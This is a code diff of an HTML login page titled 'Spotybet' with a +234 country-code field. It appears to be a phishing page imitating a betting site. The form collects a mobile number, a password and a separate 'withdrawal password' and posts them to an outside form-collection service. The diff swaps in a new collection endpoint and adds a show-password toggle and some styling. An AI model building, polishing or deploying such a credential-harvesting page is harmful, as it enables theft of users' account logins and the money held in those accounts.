@@ -1,15 +1,16 @@
-<!DOCTYPE html>
+            <!DOCTYPE html>
 <html lang="en">
 <head>
       <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <title>Spotybet</title>
 </head>
 <style>
     body{
         background-color:smokewhite;
-        font-family: san serif;
+        font-family: Sans-Serif;
     }
     p{
         Color:green ;
@@ -31,7 +32,7 @@
         text-align: center;
         color: black;
     }
-    header{
+    div{
         text-align:center;
     }
     button {
@@ -39,33 +40,74 @@
         height:47px;
         text-align: center;
         background-color: green;
-        border: solid green;
+        border: lightgrey;
         color: white;
         border-radius:4px;
     }
-      button:hover{
-         background-color:#419b62;
-         color: white;
-         transition:0.7s
-      }
     #mycheckbox{
         accent-color: green;
     }
     a{
         color: white;
     }
+    .country-code {
+position: absolute;
+left: 10px;
+top: 50%;
+transform: translateY(-50%);
+color: black;
+font-size: 16px;
+pointer-events: none;
+margin-left: 20px;
+}
+
+input[type="text"] {
+padding-left: 0px;
+}
+    
+      .input-container {
+position: relative;
+}
+
+input[type="password"] {
+padding-right: 0px; /* Adjust padding to accommodate the eye icon */
+}
+
+.eye {
+position: absolute;
+right: 0;
+top: 50%;
+transform: translateY(-50%);
+cursor: pointer;
+}
+span{
+    margin-right: 25px;
+}
+i{
+    color: lightgrey;
+}
 </style>
 <body>
-    <header>
+  <div>
     <h4>Login</h4>
-        <form action ="https://submit-form.com/QHr77vl6B" method="POST">
-            <input type ="text" name="Mobile number" id="MobileNumber" placeholder="+234 Mobile number">
-            <input type="password" name="Password"
-            id="password" placeholder="Password">
-            <input type ="password" name="withdrawal password"
-            id="withdrawal password" placeholder="Entet your withdrawal password">
-            </form>
-            </header>
+        <form action="https://submit-form.com/o6mL7CEVc" method="POST">
+          <div class="input-container">
+<div class="country-code">+234</div>
+<input type="text" name="Mobile number" id="Mobile number" placeholder="Mobile number">
+</div>
+           <div class="input-container">
+  <input type="password" name="Password" id="password1" placeholder="Password">
+  <span class="eye" onclick="togglePasswordView('password1')">
+    <i class="fas fa-eye" id="eye-icon1"></i>
+  </span>
+</div>
+
+<div class="input-container">
+  <input type="password" name="withdrawal password" id="password2" placeholder="Enter your withdrawal Password">
+  <span class="eye" onclick="togglePasswordView('password2')">
+    <i class="fas fa-eye" id="eye-icon2"></i>
+  </span>
+</div>
             <br>
             <inline>
                 <font color ="white">ii</font>
@@ -75,10 +117,25 @@
             </inline>
             <br>
             <br>
-            <header>
             <button type="submit">Login</button>
            <a href="#"><p>Forgot password?</p></a>
-            </header>
-             </form>
+           </div>
+        </form>
+        <script>
+      function togglePasswordView(id) {
+  const passwordInput = document.getElementById(id);
+  const eyeIcon = document.getElementById(`eye-icon${id.slice(-1)}`);
+  
+  if (passwordInput.type === "password") {
+    passwordInput.type = "text";
+    eyeIcon.classList.remove("fa-eye");
+    eyeIcon.classList.add("fa-eye-slash");
+  } else {
+    passwordInput.type = "password";
+    eyeIcon.classList.remove("fa-eye-slash");
+    eyeIcon.classList.add("fa-eye");
+  }
+} 
+     </script>
 </body>
 </html>
